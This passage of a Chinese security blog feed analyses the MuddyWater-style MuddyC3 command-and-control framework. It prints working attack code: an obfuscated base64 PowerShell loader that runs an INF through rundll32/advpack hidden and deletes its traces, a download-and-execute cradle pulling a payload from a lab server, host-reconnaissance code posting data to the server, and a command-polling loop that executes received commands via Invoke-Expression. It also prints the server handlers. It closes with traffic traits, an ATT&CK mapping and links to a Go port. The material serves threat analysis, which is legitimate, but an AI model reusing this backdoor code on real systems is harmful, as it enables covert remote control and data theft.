class="string">&#x27;JHM9KGdldC1jb250ZW50IEM6XFxQcm9ncmFtRGF0YVxcYS56aXApOyRkID0gQCgpOyR2ID0gMDskYyA9IDA7d2hpbGUoJGMgLW5lICRzLmxlbmd0aCl7JHY9KCR2KjUyKSsoW0ludDMyXVtjaGFyXSRzWyRjXS00MCk7aWYoKCgkYysxKSUzKSAtZXEgMCl7d2hpbGUoJHYgLW5lIDApeyR2dj0kdiUyNTY7aWYoJHZ2IC1ndCAwKXskZCs9W2NoYXJdW0ludDMyXSR2dn0kdj1bSW50MzJdKCR2LzI1Nil9fSRjKz0xO307W2FycmF5XTo6UmV2ZXJzZSgkZCk7aWV4KFtTdHJpbmddOjpKb2luKCcnLCRkKSk7&#x27;</span>)));<span class="built_in">set-content</span> <span class="literal">-path</span> c:\programdata\sct.ini <span class="literal">-value</span> ([<span class="type">System.Text.Encoding</span>]::ASCII.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="string">&#x27;W3ZlcnNpb25dDQpTaWduYXR1cmU9JGNoaWNhZ28kDQoNCltFeGNlbF0NClVuUmVnaXN0ZXJPQ1hzPUV2ZW50TWFuYWdlcg0KDQpbRXZlbnRNYW5hZ2VyXQ0KJTExJVxzY3JvYmouZGxsLE5JLGM6L3Byb2dyYW1kYXRhL3NjdC56aXANCg0KW1N0cmluZ3NdDQpBcHBBY3QgPSAiU09GVFdBUkVcTWljcm9zb2Z0XENvbm5lY3Rpb24gTWFuYWdlciINClNlcnZpY2VOYW1lPSIgIg0KU2hvcnRTdmNOYW1lPSIgIg==&#x27;</span>)));<span class="built_in">start-process</span> rundll32.exe <span class="literal">-ArgumentList</span> <span class="string">&quot;advpack.dll,LaunchINFSection C:\ProgramData\sct.ini,Excel,1,&quot;</span> <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span>;<span class="built_in">start-sleep</span> <span class="number">30</span>;<span class="built_in">del</span> c:\programdata\a.zip;<span class="built_in">del</span> c:\programdata\sct.ps1;<span class="built_in">del</span> c:\programdata\sct.zip;<span class="built_in">del</span> c:\programdata\sct.ini;</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/28.png" alt="enter description here"></p><p>剩余两个base64部分为以下内容，进行其他的功能传输</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span>=(<span class="built_in">get-content</span> C:\\ProgramData\\a.zip);<span class="variable">$d</span> = <span class="selector-tag">@</span>();<span class="variable">$v</span> = <span class="number">0</span>;<span class="variable">$c</span> = <span class="number">0</span>;<span class="keyword">while</span>(<span class="variable">$c</span> <span class="operator">-ne</span> <span class="variable">$s</span>.length)&#123;<span class="variable">$v</span>=(<span class="variable">$v</span>*<span class="number">52</span>)+([<span class="built_in">Int</span><span class="type">32</span>][<span class="built_in">char</span>]<span class="variable">$s</span>[<span class="variable">$c</span>]<span class="literal">-40</span>);<span class="keyword">if</span>(((<span class="variable">$c</span>+<span class="number">1</span>)%<span class="number">3</span>) <span class="operator">-eq</span> <span class="number">0</span>)&#123;<span class="keyword">while</span>(<span class="variable">$v</span> <span class="operator">-ne</span> <span class="number">0</span>)&#123;<span class="variable">$vv</span>=<span class="variable">$v</span>%<span class="number">256</span>;<span class="keyword">if</span>(<span class="variable">$vv</span> <span class="operator">-gt</span> <span class="number">0</span>)&#123;<span class="variable">$d</span>+=[<span class="built_in">char</span>][<span class="built_in">Int</span><span class="type">32</span>]<span class="variable">$vv</span>&#125;<span class="variable">$v</span>=[<span class="built_in">Int</span><span class="type">32</span>](<span class="variable">$v</span>/<span class="number">256</span>)&#125;&#125;<span class="variable">$c</span>+=<span class="number">1</span>;&#125;;[<span class="built_in">array</span>]::Reverse(<span class="variable">$d</span>);<span class="built_in">iex</span>([<span class="built_in">String</span>]::Join(<span class="string">&#x27;&#x27;</span>,<span class="variable">$d</span>));</span><br></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[version]</span></span><br><span class="line"><span class="attr">Signature</span>=<span class="variable">$chicago</span>$</span><br><span class="line"></span><br><span class="line"><span class="section">[Excel]</span></span><br><span class="line"><span class="attr">UnRegisterOCXs</span>=EventManager</span><br><span class="line"></span><br><span class="line"><span class="section">[EventManager]</span></span><br><span class="line">%11%\scrobj.dll,NI,c:/programdata/sct.zip</span><br><span class="line"></span><br><span class="line"><span class="section">[Strings]</span></span><br><span class="line"><span class="attr">AppAct</span> = <span class="string">&quot;SOFTWARE\Microsoft\Connection Manager&quot;</span></span><br><span class="line"><span class="attr">ServiceName</span>=<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="attr">ShortSvcName</span>=<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure><h3 id="1-2参数分析"><a href="#1-2参数分析" class="headerlink" title="1.2参数分析"></a>1.2参数分析</h3><p>通过分析core文件夹下cmd.py文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/7.png" alt="enter description here"></p><p>得出AGENTS字典中每个元素的结构如下：</p><table><thead><tr><th>角标</th><th>参数</th><th>归属</th></tr></thead><tbody><tr><td>*</td><td>id</td><td>key值</td></tr><tr><td>0</td><td>ExternalIP</td><td>data</td></tr><tr><td>1</td><td>id</td><td>data</td></tr><tr><td>2</td><td>status</td><td>data</td></tr><tr><td>3</td><td>os</td><td>data</td></tr><tr><td>4</td><td>InternalIP</td><td>data</td></tr><tr><td>5</td><td>Arch</td><td>data</td></tr><tr><td>6</td><td>ComputerName</td><td>data</td></tr><tr><td>7</td><td>UserName</td><td>data</td></tr></tbody></table><p><strong>AGENT是一个’id:data’形式的字典</strong>，其中data格式如下：</p><table><thead><tr><th>角标</th><th>参数</th></tr></thead><tbody><tr><td>0</td><td>id</td></tr><tr><td>1</td><td>status</td></tr><tr><td>2</td><td>Internal IP</td></tr><tr><td>3</td><td>OS</td></tr><tr><td>4</td><td>Arch</td></tr><tr><td>5</td><td>Computer Name</td></tr><tr><td>6</td><td>User Name</td></tr></tbody></table><p><strong>在core文件夹下webserver.py文件中</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/8.png" alt="enter description here"></p><p>分别定义了多种url 接口</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/31.png" alt="enter description here"></p><p>url访问功能分类如下：</p><table><thead><tr><th>编号</th><th>类别</th><th>表示方法</th><th>get&#x2F;post</th><th>功能或结果</th></tr></thead><tbody><tr><td>1</td><td>index</td><td>&#x2F;</td><td>get</td><td>返回‘hello’</td></tr><tr><td>2</td><td>payload</td><td>&#x2F;get</td><td>get</td><td>返回‘config&#x2F;PAYLOAD()’</td></tr><tr><td>3</td><td>payloadc</td><td>&#x2F;getc</td><td>get</td><td>返回‘toB52(config&#x2F;PAYLOAD())’</td></tr><tr><td>4</td><td>payloadjf</td><td>&#x2F;hjf</td><td>get</td><td>返回C:&#x2F;&#x2F;ProgramData下a.zip和b.ps1</td></tr><tr><td>5</td><td>payloadjfs</td><td>&#x2F;hjfs</td><td>get</td><td>返回C:&#x2F;&#x2F;ProgramData下sct.ini</td></tr><tr><td>6</td><td>sct</td><td>&#x2F;sct</td><td>get</td><td>返回ps1文件</td></tr><tr><td>7</td><td>mshta</td><td>&#x2F;hta</td><td>get</td><td>返回ps1文件</td></tr><tr><td>8</td><td>info</td><td>&#x2F;info&#x2F;~</td><td>post</td><td>查询id，若不存在则在AGENTS中添加</td></tr><tr><td>9</td><td>download</td><td>&#x2F;dl&#x2F;~</td><td>post</td><td>从服务端指定路径下载文件</td></tr><tr><td>10</td><td>upload</td><td>&#x2F;up</td><td></td><td>暂不支持该功能</td></tr><tr><td>11</td><td>img</td><td>&#x2F;img&#x2F;~</td><td>post</td><td>得到相关img</td></tr><tr><td>12</td><td>command</td><td>&#x2F;cm&#x2F;~</td><td>get</td><td>得到‘config.COMMAND[id]’中的命令</td></tr><tr><td>13</td><td>result</td><td>&#x2F;re&#x2F;~</td><td>post</td><td>得到指定id主机的data</td></tr><tr><td>14</td><td>modules</td><td>&#x2F;md&#x2F;~</td><td>post</td><td>添加模块</td></tr></tbody></table><h3 id="2-客户端分析"><a href="#2-客户端分析" class="headerlink" title="2.客户端分析"></a>2.客户端分析</h3><p>由1.1.4部分中的payload均为加密部分，而最核心的就是在core中的payload.ps1部分，在1.1.4小节中显示的这些payload全部都是围绕着core中的payload.ps1中从而去演变加密，下面我们从简单而去分析payload.ps1部分</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/15.png" alt="enter description here"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="string">&quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.90.135:4444/get&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><p>PowerShell的主要作用是从远程位置下载恶意文件到受害者主机中，然后使用诸如<strong>Start-Porcess</strong>、<strong>Invoke-Item</strong>或者<strong>Invoke-Expression</strong>（**-IEX**）之类的命令执行恶意文件，PowerShell也可以将远程文件直接下载到受害者主机内存中，然后从内存中执行。</p><p>实际攻击活动中经常使用到<strong>System.net.Webclient</strong>中的两种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(New-object System.net.webclient).DownlodFile() </span><br><span class="line">(New-object System.net.Webclient).DownloadString()</span><br></pre></td></tr></table></figure><h4 id="2-1-agent-info信息"><a href="#2-1-agent-info信息" class="headerlink" title="2.1 agent info信息"></a>2.1 agent info信息</h4><p>在<code>http://192.168.90.135:4444/get</code>中的部分powershell代码为agent的相关信息显示如下</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hostname</span> = <span class="variable">$env:COMPUTERNAME</span>;</span><br><span class="line"><span class="variable">$whoami</span> = <span class="variable">$env:USERNAME</span>;</span><br><span class="line"><span class="variable">$arch</span> = (<span class="built_in">Get-WmiObject</span> Win32_OperatingSystem).OSArchitecture</span><br><span class="line"><span class="variable">$os</span> = (<span class="built_in">Get-WmiObject</span> <span class="literal">-class</span> Win32_OperatingSystem).Caption + <span class="string">&quot;(<span class="variable">$arch</span>)&quot;</span>;</span><br><span class="line"><span class="variable">$domain</span> = (<span class="built_in">Get-WmiObject</span> Win32_ComputerSystem).Domain;</span><br><span class="line"><span class="variable">$IP</span>=(<span class="built_in">gwmi</span> <span class="literal">-query</span> <span class="string">&quot;Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True&quot;</span>).IPAddress[<span class="number">0</span>]</span><br><span class="line"><span class="variable">$random</span> = <span class="operator">-join</span> ((<span class="number">65</span>..<span class="number">90</span>) | <span class="built_in">Get-Random</span> <span class="literal">-Count</span> <span class="number">5</span> | % &#123;[<span class="built_in">char</span>]<span class="variable">$_</span>&#125;);</span><br><span class="line"><span class="variable">$agent</span>=<span class="string">&quot;<span class="variable">$random</span>-img.jpeg&quot;</span></span><br><span class="line"><span class="variable">$finaldata</span>=<span class="string">&quot;<span class="variable">$os</span>**<span class="variable">$IP</span>**<span class="variable">$arch</span>**<span class="variable">$hostname</span>**<span class="variable">$domain</span>**<span class="variable">$whoami</span>&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/16.png" alt="enter description here"></p><h4 id="2-2-info信息回传给服务端"><a href="#2-2-info信息回传给服务端" class="headerlink" title="2.2 info信息回传给服务端"></a>2.2 info信息回传给服务端</h4><p><strong>服务端 url –info代码</strong> </p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/18.png" alt="enter description here"></p><p>访问&#x2F;info,由于info使用post包</p><p><strong>客户端powershell 代码</strong> ，通过POST传参进行将data数据回传</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/19.png" alt="enter description here"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$h3</span> = <span class="built_in">new-object</span> net.WebClient</span><br><span class="line">      <span class="variable">$h3</span>.Headers.Add(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)</span><br><span class="line">      <span class="variable">$h</span>=<span class="variable">$h3</span>.UploadString(<span class="string">&quot;http://192.168.90.135:4444/info/<span class="variable">$agent</span>&quot;</span>,<span class="variable">$finaldata</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$h2</span> = <span class="built_in">New-Object</span> system.Net.WebClient;</span><br><span class="line"><span class="variable">$h3</span> = <span class="built_in">New-Object</span> system.Net.WebClient;</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/21.png" alt="enter description here"></p><h4 id="2-3-访问-cm"><a href="#2-3-访问-cm" class="headerlink" title="2.3 访问&#x2F;cm"></a>2.3 访问&#x2F;cm</h4><p>带id访问&#x2F;cm接口，访问&#x2F;cm&#x2F;[id],取得服务端发送的控制命令，控制命令组成如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="variable">$true</span>)&#123;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$h2</span>.downloadString(<span class="string">&quot;http://192.168.90.135:4444/cm/<span class="variable">$agent</span>&quot;</span>);</span><br><span class="line"><span class="variable">$cmd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>编号</th><th>表示</th><th>意义</th></tr></thead><tbody><tr><td>1</td><td>&#x2F;get</td><td>访问&#x2F;get接口</td></tr><tr><td>2</td><td>&#x2F;getc</td><td>访问&#x2F;getc接口</td></tr><tr><td>3</td><td>&#x2F;hjf</td><td>访问&#x2F;hjf接口</td></tr><tr><td>4</td><td>&#x2F;hjfs</td><td>访问&#x2F;hjfs接口</td></tr><tr><td>5</td><td>&#x2F;sct</td><td>访问&#x2F;sct接口</td></tr><tr><td>6</td><td>&#x2F;hta</td><td>访问&#x2F;hta接口</td></tr><tr><td>7</td><td>dl</td><td>访问&#x2F;dl接口</td></tr><tr><td>8</td><td>&#x2F;up</td><td>访问&#x2F;up接口</td></tr><tr><td>9</td><td>&#x2F;img</td><td>访问&#x2F;img接口</td></tr><tr><td>10</td><td>&#x2F;md</td><td>访问&#x2F;md接口</td></tr><tr><td>11</td><td>其他</td><td>其他powershell可以直接执行的命令</td></tr></tbody></table><p>服务端发出了一个命令：whoami</p><p>客户端循环获取&#x2F;cm 的地址的内容</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/22.png" alt="enter description here"></p><h4 id="2-4-执行回传输出信息"><a href="#2-4-执行回传输出信息" class="headerlink" title="2.4 执行回传输出信息"></a>2.4 执行回传输出信息</h4><p>由Invoke-Expression执行 $cmd命令，将输出的信息回传&#x2F;re 服务端</p><p>客户端</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$output</span>=<span class="built_in">Invoke-Expression</span> (<span class="variable">$cmd</span>) | <span class="built_in">Out-String</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>&#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="variable">$Error</span>[<span class="number">0</span>] | <span class="built_in">Out-String</span>;</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="variable">$output</span>)</span><br><span class="line"><span class="variable">$redata</span>=[<span class="type">System.Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line"><span class="variable">$re</span> = <span class="variable">$h3</span>.UploadString(<span class="string">&quot;http://192.168.90.135:4444/re/<span class="variable">$agent</span>&quot;</span>,<span class="variable">$redata</span>);</span><br></pre></td></tr></table></figure><p>服务端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">command</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GET</span>(<span class="params">self, <span class="built_in">id</span></span>):</span><br><span class="line">        <span class="keyword">if</span> config.AGENTS.get(<span class="built_in">id</span>) != <span class="literal">None</span>:</span><br><span class="line">            config.TIME[<span class="built_in">id</span>] = time.time()</span><br><span class="line">        <span class="keyword">if</span> config.AGENTS.get(<span class="built_in">id</span>) != <span class="literal">None</span> <span class="keyword">and</span> <span class="built_in">len</span>(config.COMMAND.get(<span class="built_in">id</span>)) &gt; <span class="number">0</span>:</span><br><span class="line">            cmd = config.COMMAND[<span class="built_in">id</span>].pop(<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">print</span> bcolors.OKGREEN + <span class="string">&#x27;[~] &#x27;</span> + <span class="built_in">id</span> + <span class="string">&#x27;:&#x27;</span> + cmd + bcolors.ENDC</span><br><span class="line">            <span class="keyword">return</span> cmd</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">elif</span> config.AGENTS.get(<span class="built_in">id</span>) == <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span> bcolors.OKGREEN + <span class="string">&#x27;[~] &#x27;</span> + <span class="built_in">id</span> + <span class="string">&#x27;:Register&#x27;</span> + bcolors.ENDC</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;REGISTER&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">result</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">self, <span class="built_in">id</span></span>):</span><br><span class="line">        data = web.data()</span><br><span class="line">        <span class="keyword">if</span> config.AGENTS.get(<span class="built_in">id</span>) != <span class="literal">None</span> <span class="keyword">and</span> data != <span class="literal">None</span>:</span><br><span class="line">            data = data.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">            p_out = <span class="string">&#x27;[+] Agent (%d) - %s send Result&#x27;</span> % (config.AGENTS[<span class="built_in">id</span>][<span class="number">0</span>], config.AGENTS[<span class="built_in">id</span>][<span class="number">7</span>])</span><br><span class="line">            <span class="built_in">print</span> bcolors.OKGREEN + p_out + bcolors.ENDC</span><br><span class="line">            <span class="built_in">print</span> data</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;REGISTER&#x27;</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对比<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/30.png" alt="enter description here"></p><h3 id="整体POC-效果图如下："><a href="#整体POC-效果图如下：" class="headerlink" title="整体POC 效果图如下："></a>整体POC 效果图如下：</h3><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/23.png" alt="enter description here"></p><h3 id="最终效果图："><a href="#最终效果图：" class="headerlink" title="最终效果图："></a>最终效果图：</h3><p>下图中上部分为kali (主控端)，下半部分为win10(被控端)</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2.png" alt="enter description here"></p><h2 id="污水攻击特点总结"><a href="#污水攻击特点总结" class="headerlink" title="污水攻击特点总结"></a>污水攻击特点总结</h2><h3 id="5-1心跳周期"><a href="#5-1心跳周期" class="headerlink" title="5.1心跳周期"></a>5.1心跳周期</h3><p>被控端定期向主控端发出get请求，查看是否有新的命令。</p><p><a href="http://192.168.90.135:4444/get/cm/[id]">http://192.168.90.135:4444/get/cm/[id]</a></p><h3 id="5-2-http请求成对出现"><a href="#5-2-http请求成对出现" class="headerlink" title="5.2 http请求成对出现"></a>5.2 http请求成对出现</h3><p>一次取命令对应一次命令执行结果回传。</p><p><a href="http://192.168.90.135:4444/get/cm/[id]">http://192.168.90.135:4444/get/cm/[id]</a></p><p><a href="http://192.168.90.135:4444/re/[id]">http://192.168.90.135:4444/re/[id]</a></p><h3 id="5-3云控下发powershell脚本"><a href="#5-3云控下发powershell脚本" class="headerlink" title="5.3云控下发powershell脚本"></a>5.3云控下发powershell脚本</h3><p>传统远控采取命令约定方式，主控端向被控端发送命令代码，被控端在后门代码中匹配成功然后执行。</p><p>而污水攻击不再使用命令代码，而是就地采用被控端本地现有工具powershell，将命令以高度混淆的powershell形式下发，这样做保证了样本即使被捕获，恶意活动不会暴露、C2服务器不会被溯源。</p><h3 id="5-4可滥用web2-0网站作为信息传输中介"><a href="#5-4可滥用web2-0网站作为信息传输中介" class="headerlink" title="5.4可滥用web2.0网站作为信息传输中介"></a>5.4可滥用web2.0网站作为信息传输中介</h3><p>任何主机可以不经注册访问网站，向网站发出http请求。</p><p>污水攻击利用的web2.0网站的服务器是攻击者控制的，因此有被溯源的风险。</p><h3 id="5-5协议：http"><a href="#5-5协议：http" class="headerlink" title="5.5协议：http"></a>5.5协议：http</h3><p>明文不加密。</p><p><strong>大体对应最新ATT&amp;CK映射内容为以下列表</strong></p><table><thead><tr><th>执行</th><th>采集</th><th>命令与控制</th><th>影响力</th></tr></thead><tbody><tr><td>利用客户端执行(T1203)</td><td>自动收集(T1119)</td><td>应用层协议（T1071）</td><td>数据处理(T1565)</td></tr><tr><td>命令行（T1059）</td><td></td><td>数据编码(T1132)</td><td></td></tr><tr><td></td><td></td><td>数据混淆（T1001）</td><td></td></tr><tr><td></td><td></td><td>非标准端口(T1571)</td><td></td></tr></tbody></table><h2 id="结合golang"><a href="#结合golang" class="headerlink" title="结合golang"></a>结合golang</h2><p>作者: demosnec666 WBGIII</p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/muddyc3_golang.mp4'    frameborder="0"     allowfullscreen></iframe><p><a href="https://github.com/demonsec666/muddyc3_golang/releases/tag/v1.0">https://github.com/demonsec666/muddyc3_golang/releases/tag/v1.0</a><br><a href="https://github.com/demonsec666/muddyc3_golang">https://github.com/demonsec666/muddyc3_golang</a></p><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><blockquote><p>【1】<a href="https://www.freebuf.com/articles/web/213834.html">https://www.freebuf.com/articles/web/213834.html</a></p><p>【2】<a href="https://attack.mitre.org/groups/G0069/">https://attack.mitre.org/groups/G0069/</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/1.png&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="APT" scheme="https://www.ggsec.cn/categories/APT/"/>
    
    <category term="C2" scheme="https://www.ggsec.cn/categories/C2/"/>
    
    
    <category term="windows" scheme="https://www.ggsec.cn/tags/windows/"/>
    
    <category term="ATT&amp;CK" scheme="https://www.ggsec.cn/tags/ATT-CK/"/>
    
    <category term="C2" scheme="https://www.ggsec.cn/tags/C2/"/>
    
  </entry>
  
</feed>
